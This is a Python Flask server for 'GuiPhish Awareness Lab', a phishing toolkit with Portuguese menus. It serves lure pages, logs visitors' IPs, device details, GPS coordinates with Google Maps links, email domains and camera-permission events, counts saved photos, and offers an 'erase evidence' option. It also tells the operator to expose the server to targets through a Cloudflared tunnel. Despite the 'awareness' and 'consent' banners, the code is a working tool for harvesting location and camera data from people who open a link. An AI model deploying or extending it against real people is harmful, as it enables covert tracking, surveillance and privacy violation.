import os
import json
import shutil
import random
from datetime import datetime
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS

BANNERS = [
r"""
   ██████╗ ██╗   ██╗██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
  ██╔════╝ ██║   ██║██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
  ██║  ███╗██║   ██║██║██████╔╝███████║██║███████╗███████║
  ██║   ██║██║   ██║██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
  ╚██████╔╝╚██████╔╝██║██║     ██║  ██║██║███████║██║  ██║
   ╚═════╝  ╚═════╝ ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝

        🔐 GuiPhish Awareness Lab
        🎣 Security Awareness Toolkit
        🐧 Running on Kali Linux
        CRIADO POR: Geovanni Andrade
""",

r"""
   ▄████  █    ██  ██▓ ██▓███   ██░ ██  ██▓  ██████  ██░ ██
  ██▒ ▀█▒ ██  ▓██▒▓██▒▓██░  ██▒▓██░ ██▒▓██▒▒██    ▒ ▓██░ ██▒
 ▒██░▄▄▄░▓██  ▒██░▒██▒▓██░ ██▓▒▒██▀▀██░▒██▒░ ▓██▄   ▒██▀▀██░
 ░▓█  ██▓▓▓█  ░██░░██░▒██▄█▓▒ ▒░▓█ ░██ ░██░  ▒   ██▒░▓█ ░██
 ░▒▓███▀▒▒▒█████▓ ░██░▒██▒ ░  ░░▓█▒░██▓░██░▒██████▒▒░▓█▒░██▓
  ░▒   ▒ ░▒▓▒ ▒ ▒ ░▓  ▒▓▒░ ░  ░ ▒ ░░▒░▒░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒
   ░   ░ ░░▒░ ░ ░  ▒ ░░▒ ░      ▒ ░▒░ ░ ▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░
 ░ ░   ░  ░░░ ░ ░  ▒ ░░░        ░  ░░ ░ ▒ ░░  ░  ░   ░  ░░ ░
       ░    ░      ░            ░  ░  ░ ░        ░   ░  ░  ░

        📊 Awareness • Logs • Reports
        ⚠️ Authorized Lab Only
        CRIADO POR: Geovanni Andrade
""",

r"""
   ██████╗ ██╗   ██╗██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
  ██╔════╝ ██║   ██║██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
  ██║  ███╗██║   ██║██║██████╔╝███████║██║███████╗███████║
  ██║   ██║██║   ██║██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
  ╚██████╔╝╚██████╔╝██║██║     ██║  ██║██║███████║██║  ██║
   ╚═════╝ ╚═╝      ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝

        👁️ Browser Permission Lab
        📡 Camera • Location • Email Simulation
        🧪 Educational Use Only
""",

r"""
   _____       _ _____  _     _     _     
  / ____|     (_)  __ \| |   (_)   | |    
 | |  __ _   _ _| |__) | |__  _ ___| |__  
 | | |_ | | | | |  ___/| '_ \| / __| '_ \ 
 | |__| | |_| | | |    | | | | \__ \ | | |
  \_____|\__,_|_|_|    |_| |_|_|___/_| |_|

        🔐 GuiPhish Awareness Lab
        🧠 Security Education Toolkit
        👤 Created by Geovanni Andrade
""",

r"""
      ________        .__ __________.__    .__       .__     
     /  _____/ __ __  |__|\______   \  |__ |__| _____|  |__  
    /   \  ___|  |  \ |  | |     ___/  |  \|  |/  ___/  |  \ 
    \    \_\  \  |  / |  | |    |   |   Y  \  |\___ \|   Y  \
     \______  /____/  |__| |____|   |___|  /__/____  >___|  /
            \/                         \/        \/     \/ 

        🎣 Social Engineering Awareness
        🌍 Browser Permission Simulation
        🛡️ Use with consent
""",

r"""
    ________      .__ __________.__    .__       .__     
   /  _____/ __ __|__|\______   \  |__ |__| _____|  |__  
  /   \  ___|  |  \  | |     ___/  |  \|  |/  ___/  |  \ 
  \    \_\  \  |  /  | |    |   |   Y  \  |\___ \|   Y  \
   \______  /____/|__| |____|   |___|  /__/____  >___|  /
          \/                         \/        \/     \/ 

        📸 Camera Awareness
        🌍 Location Awareness
        📧 Email/Account Simulation
        CRIADO POR: Geovanni Andrade
"""
]

app = Flask(__name__)
CORS(app)

PASTAS = ["logs", "fotos", "relatorios"]

for pasta in PASTAS:
    os.makedirs(pasta, exist_ok=True)


def ler_eventos():
    caminho = "logs/eventos.jsonl"

    if not os.path.exists(caminho):
        return []

    eventos = []

    with open(caminho, "r", encoding="utf-8") as f:
        for linha in f:
            try:
                eventos.append(json.loads(linha))
            except Exception:
                pass

    return eventos


def mostrar_logs():
    eventos = ler_eventos()

    print("\n📊 Últimos eventos:\n")

    if not eventos:
        print("[!] Nenhum evento registrado ainda.\n")
        return

    for evento in eventos[-10:]:
        print(
            f"- {evento.get('timestamp_servidor')} | "
            f"{evento.get('tipo')} | "
            f"{evento.get('acao')} | "
            f"{evento.get('status')} | "
            f"IP: {evento.get('ip')}"
        )

        if evento.get("google_maps") not in [None, "N/A"]:
            print(f"  🌍 Maps: {evento.get('google_maps')}")

        if evento.get("email_domain") not in [None, "N/A"]:
            print(f"  📧 Domínio: {evento.get('email_domain')}")

    print("")


def gerar_relatorio():
    eventos = ler_eventos()

    fotos = []
    if os.path.exists("fotos"):
        fotos = [f for f in os.listdir("fotos") if f.endswith(".jpg")]

    total_camera = len([e for e in eventos if e.get("tipo") == "camera"])
    total_localizacao = len([e for e in eventos if e.get("tipo") == "localizacao"])
    total_email = len([e for e in eventos if e.get("tipo") == "email"])
    total_permitidos = len([e for e in eventos if e.get("status") == "permitida"])

    nome = f"relatorios/relatorio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

    with open(nome, "w", encoding="utf-8") as f:
        f.write("GuiPhish Awareness Lab - Relatório\n")
        f.write("=" * 40 + "\n\n")
        f.write(f"Gerado em: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        f.write(f"Total de eventos: {len(eventos)}\n")
        f.write(f"Eventos de câmera: {total_camera}\n")
        f.write(f"Eventos de localização: {total_localizacao}\n")
        f.write(f"Eventos de e-mail/conta: {total_email}\n")
        f.write(f"Permissões concedidas: {total_permitidos}\n")
        f.write(f"Fotos locais salvas: {len(fotos)}\n\n")

        f.write("Últimos eventos:\n")
        for evento in eventos[-10:]:
            f.write(json.dumps(evento, ensure_ascii=False) + "\n")

    print(f"\n[+] Relatório gerado: {nome}\n")


def limpar_evidencias():
    confirmacao = input("\n[!] Apagar fotos, logs e relatórios locais? Digite SIM para confirmar: ")

    if confirmacao != "SIM":
        print("[+] Operação cancelada.\n")
        return

    for pasta in PASTAS:
        if os.path.exists(pasta):
            shutil.rmtree(pasta)
        os.makedirs(pasta, exist_ok=True)

    print("[+] Evidências locais apagadas com sucesso.\n")


def menu():
    print("\n[+] GuiPhish Awareness Lab\n")
    print("1) 📸 Testar permissão de câmera")
    print("2) 🌍 Testar permissão de localização")
    print("3) 📊 Dashboard / visualizar logs")
    print("4) 🧾 Gerar relatório do lab")
    print("5) 🧹 Limpar evidências locais")
    print("6) 📧 Simulação de e-mail/conta")
    print("7) 🛑 Sair")

    return input("\nDigite a opção: ")


@app.route("/")
def index():
    return send_file("index.html")


@app.route("/email")
def email_page():
    return send_file("email.html")


@app.route("/evento", methods=["POST"])
def evento():
    try:
        data = request.json or {}

        tipo = data.get("tipo", "desconhecido")
        modo = app.config.get("MODO", "completo")

        if modo == "camera" and tipo not in ["camera", "email"]:
            return jsonify({"status": "bloqueado"}), 403

        if modo == "localizacao" and tipo != "localizacao":
            return jsonify({"status": "bloqueado"}), 403

        if modo == "email" and tipo != "email":
            return jsonify({"status": "bloqueado"}), 403

        evento_log = {
            "timestamp_servidor": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "ip": request.remote_addr,
            "tipo": tipo,
            "acao": data.get("acao", "N/A"),
            "status": data.get("status", "N/A"),
            "user_agent": data.get("userAgent", "N/A"),
            "platform": data.get("platform", "N/A"),
            "language": data.get("language", "N/A"),
            "timezone": data.get("timezone", "N/A"),
            "latitude": data.get("latitude", "N/A"),
            "longitude": data.get("longitude", "N/A"),
            "accuracy": data.get("accuracy", "N/A"),
            "google_maps": data.get("google_maps", "N/A"),
            "email_domain": data.get("email_domain", "N/A")
        }

        with open("logs/eventos.jsonl", "a", encoding="utf-8") as f:
            f.write(json.dumps(evento_log, ensure_ascii=False) + "\n")

        print(f"\n[+] EVENTO REGISTRADO: {tipo} | {evento_log['status']} | IP: {request.remote_addr}")

        if tipo == "localizacao" and evento_log["latitude"] != "N/A":
            print(f"[+] Localização: {evento_log['latitude']}, {evento_log['longitude']}")
            print(f"[+] Google Maps: {evento_log['google_maps']}")

        if tipo == "email":
            print(f"[+] Domínio informado: {evento_log.get('email_domain', 'N/A')}")

        return jsonify({"status": "ok"}), 200

    except Exception as e:
        print(f"[-] Erro ao registrar evento: {e}")
        return jsonify({"status": "erro"}), 500


@app.route("/painel", methods=["GET"])
def painel():
    return "Painel bloqueado. Consulte os eventos localmente em logs/eventos.jsonl.", 403


if __name__ == "__main__":
    print(random.choice(BANNERS))

    while True:
        escolha = menu()

        if escolha == "1":
            app.config["MODO"] = "camera"
            print("\n[+] Modo câmera ativo. Iniciando Flask...\n")
            break

        elif escolha == "2":
            app.config["MODO"] = "localizacao"
            print("\n[+] Modo localização ativo. Iniciando Flask...\n")
            break

        elif escolha == "3":
            mostrar_logs()

        elif escolha == "4":
            gerar_relatorio()

        elif escolha == "5":
            limpar_evidencias()

        elif escolha == "6":
            app.config["MODO"] = "email"
            print("\n[+] Modo simulação de e-mail/conta ativo. Iniciando Flask...\n")
            print("[+] Para acessar a página de e-mail, abra o link do Cloudflared e adicione /email no final.")
            print("[+] Exemplo:")
            print("    https://SEU-LINK.trycloudflare.com/email\n")
            break

        elif escolha == "7":
            print("\n[+] Saindo...\n")
            exit()

        else:
            print("\n[!] Opção inválida.\n")

    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
